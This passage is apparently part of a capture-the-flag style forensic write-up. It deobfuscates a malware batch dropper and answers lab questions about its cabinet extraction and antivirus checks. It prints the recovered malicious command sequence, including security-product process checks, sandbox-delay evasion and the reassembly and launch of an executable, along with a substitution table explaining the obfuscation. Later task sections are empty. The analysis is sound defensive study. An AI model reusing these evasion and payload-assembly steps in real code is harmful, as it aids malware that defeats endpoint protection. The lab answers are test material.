That build date is itself evidence: the archive predates the infection by roughly 40 hours, so the package was prepared in advance rather than generated per-victim. The internal member names visible in the header (`Theology`, `Thanksgiving`) match files that appear in `%TEMP%` at 18:34:48, confirming this archive is the source of the second-stage drop.

**Next**

Deobfuscate the batch script to recover the exact command used against this archive.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 5
### What command did the malware use to extract content files from that .cab file?

==Answer== `extrac32 /Y Play.wp5 *.*`
<div align="center">
<br>
<br>
</div>

### 5.1 Deobfuscate the batch script

**Why this step**

`Mysql.wp5` is the orchestrator identified in 3.1, but it is deliberately unreadable. Resolving its variable substitutions exposes every command the malware issued, including the cabinet extraction that Task 5 asks for and the AV checks Task 6 counts.

**Command**

```bash
tr -d '\r' < Mysql.wp5 > b.txt
python3 deobf.py b.txt
```

`deobf.py` collects every simple `Set Name=Value` assignment, then recursively expands `%Name%` references across the whole file:

```python
import re
env = {}
for l in lines:
    m = re.match(r'^[Ss]et\s+([A-Za-z0-9_]+)=(.*)$', l)
    if m:
        env[m.group(1).lower()] = m.group(2)

def sub(s, depth=6):
    for _ in range(depth):
        new = re.sub(r'%([A-Za-z0-9_]+)%',
                     lambda m: env.get(m.group(1).lower(), m.group(0)), s)
        if new == s:
            break
        s = new
    return s
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `tr -d '\r'` | Strip carriage returns | The file uses Windows CRLF line endings; removing `\r` keeps the regexes clean |
| `re.match(r'^[Ss]et\s+(\w+)=(.*)')` | Capture variable definitions | Builds the substitution dictionary |
| Recursive `re.sub` with depth 6 | Expand nested references | Variables are built from other variables, so one pass is not enough |

**Theory — character-level batch obfuscation**

Each `Set` statement assigns a **single character** to an innocuous English word: `Set Stopping=o`, `Set Washington=f`, `Set Adventures=n`. Commands are then written as mosaics of those references — `%Washington%i%Adventures%%Climate%str` reassembles to `findstr` only when the interpreter expands them.

Two properties make this effective. Signature-based detection fails because the literal string `findstr` never appears in the file. Human review fails because the real logic is buried in 422 lines of which roughly 380 are junk — decoy lines like `mvwSphere(Arising(` that `cmd.exe` evaluates as malformed commands, discards, and continues past. Padding with garbage that the interpreter tolerates is a deliberate anti-analysis technique, not a bug.

The complete substitution table recovered from the script:

| Variable | Char | Variable | Char | Variable | Char | Variable | Char |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Ten | 5 | Ballet | X | Adventures | n | Subsection | m |
| Focusing | B | Loaded | F | Municipal | P | Of | x |
| Wide | c | Letting | y | Closest | 9 | Stopping | o |
| Generation | K | Tent | z | Fastest | w | Wow | 1 |
| Attending | g | Climb | h | Yu | C | Warranty | 2 |
| Expired | 8 | Warranties | V | Climate | d | Dropped | U |
| Launch | H | Decor | O | Data | W | Unsigned | / |
| Interactive | 6 | Digit | L | Taylor | k | Washington | f |
| Minimum | b | Assured | . | Tu | 3 | | |

**Result**

The 42 operative lines recovered from 422, in execution order:

```
302: Set oAPkKvaBlQaxyRaxdUooCTLzBRRQfXVtixj=Moscow.com
307: Set PWFtGNjfw= 
318: Set yIpWXmEeJiPlXYAAmcMkIlfSPB=5
327: tasklist | findstr /I "opssvc wrsa" & if not errorlevel 1 ping -n 192 127.0.0.1
334: Set /a Wing=448887
338: tasklist | findstr "bdservicehost SophosHealth AvastUI AVGUI nsWscSvc ekrn" & if not errorlevel 1
       Set oAPkKvaBlQaxyRaxdUooCTLzBRRQfXVtixj=AutoIt3.exe
       & Set PWFtGNjfw=.a3x
       & Set yIpWXmEeJiPlXYAAmcMkIlfSPB=300
344: md 448887
354: extrac32 /Y Play.wp5 *.*
360: set /p ="MZ" > 448887\Moscow.com <nul
363: findstr /V "Surplus" Balls >> 448887\Moscow.com
367: copy /b 448887\Moscow.com + Hell + Analyze + Theology + Thanksgiving + Subsequently
       + Mechanisms + Dawn + Draws + Appreciated + Investors 448887\Moscow.com
374: cd 448887
384: copy /b ..\Runner.wp5 + ..\Art.wp5 + ..\Gba.wp5 + ..\Romania.wp5 + ..\Refugees.wp5
       + ..\Authorization.wp5 + ..\Lock.wp5 K
387: start Moscow.com K
403: cd ..
413: choice /d n /t 5
```

**What this gives you**

Key finding: the cabinet is extracted with **`extrac32 /Y Play.wp5 *.*`**.

Break the command down:

| Element | Meaning | Simple Explanation |
| --- | --- | --- |
| `extrac32` | Signed Microsoft cabinet extraction utility in `System32` | A living-off-the-land binary — no attacker tool needs to be dropped |
| `/Y` | Suppress overwrite prompts | Runs unattended, silently replacing any existing file |
| `Play.wp5` | Source archive | The `.cab` despite its extension; `extrac32` reads magic bytes, not the name |
| `*.*` | Extract all members | Pulls all eleven files into the current directory |

`extrac32` is corroborated independently: `EXTRAC32.EXE-4FD3FA35.pf` is created at 18:34:49.168, immediately after the eleven cabinet members appear at 18:34:48.9–49.0, and `CAB05572.TMP` scratch files are created and deleted throughout the extraction.

Note the reconstruction logic that follows. `Moscow.com` is seeded with the two literal bytes `MZ`, extended with `Balls` minus its marker line, then concatenated with ten further fragments — an executable that exists only after the batch finishes assembling it.

**Next**

Count the security products the script fingerprints before it commits to that reconstruction.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 6
### During execution, the malware performed AV/EDR checks. How many security product-related strings did it search for in memory or processes?

==Answer== `8`
<div align="center">
<br>
<br>
</div>

### 6.1 Count the AV/EDR strings searched

**Why this step**

Lines 327 and 338 of the deobfuscated script both pipe `tasklist` into `findstr`. Each is a process-name check against known security software, and Task 6 asks for the total number of product strings searched.

**Command**

```bash
grep -nE "tasklist \| findstr" deobfuscated.txt
```

**Breakdown**

| Component | Meaning | Simple Explanation |
| --- | --- | --- |
| `grep -n` | Print matching lines with numbers | Locates both checks in the recovered script |
| `tasklist` | Lists every running process | The malware's way of seeing what is running without any special tooling |
| `\|` | Pipe | Feeds that list into the next command |
| `findstr` | String search | Tests whether any listed process matches a security product |
| `/I` | Case-insensitive (line 327 only) | The second check is case-sensitive; the first is not |

**Theory — how a batch script fingerprints defences**

`tasklist | findstr "<names>"` sets `errorlevel` to 0 on a match and 1 on no match. The script then branches on `if not errorlevel 1`, which is batch's awkward way of saying "if errorlevel is 0 or less" — that is, if something matched.

The two checks respond very differently, and that difference is the interesting part:

- **Line 327** — on a match, `ping -n 192 127.0.0.1` sleeps roughly 191 seconds. This is a sandbox and analyst timeout play: many automated sandboxes abandon a sample after 120 seconds of apparent inactivity, so the malware simply waits them out.
- **Line 338** — on a match, the script *changes its own identity*. `Moscow.com` becomes `AutoIt3.exe`, the script extension becomes `.a3x`, and the post-execution delay grows from 5 to 300 seconds. Running as a correctly-named, legitimately-signed AutoIt interpreter loading a correctly-named `.a3x` script is far less anomalous to a behavioural engine than a `.com` file loading an extensionless blob.

Both branches are evasion, not abort. The malware never stops on detection; it adapts.

**Result**

```
327: tasklist | findstr /I "opssvc wrsa"
       & if not errorlevel 1 ping -n 192 127.0.0.1

338: tasklist | findstr "bdservicehost SophosHealth AvastUI AVGUI nsWscSvc ekrn"
       & if not errorlevel 1 Set ...=AutoIt3.exe & Set ...=.a3x & Set ...=300
```

**What this gives you**

Key finding: **8** security-product strings are searched across the two checks.

| # | String | Vendor / product | Simple Explanation |
| --- | --- | --- | --- |
| 1 | `opssvc` | Quick Heal | Quick Heal's background service |
| 2 | `wrsa` | Webroot SecureAnywhere | Webroot's main agent |
| 3 | `bdservicehost` | Bitdefender | Bitdefender's service host |
| 4 | `SophosHealth` | Sophos | Sophos endpoint health service |
| 5 | `AvastUI` | Avast | Avast's user interface process |
| 6 | `AVGUI` | AVG | AVG's user interface process |
| 7 | `nsWscSvc` | Norton | Norton's Security Center service |
| 8 | `ekrn` | ESET | ESET's kernel service |

Note which check found nothing here. Section 2.1 established the host had no Defender operational log and no EDR of any kind, so neither branch fired: the chain proceeded down its default path as `Moscow.com` with a 5-second delay. The evasion logic is present in the sample but was never exercised on this victim.

**Next**

Follow the default branch to the process that actually executed after the batch completed.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 7
### After the batch file was executed, what was the name of the process that ran?

==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 8
### What is the original name for that process?

==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 9
### What is the SHA-256 hash of the file loaded by the above identified process?

==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 10
### What is the C2 Domain name address contacted by the malware?

==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

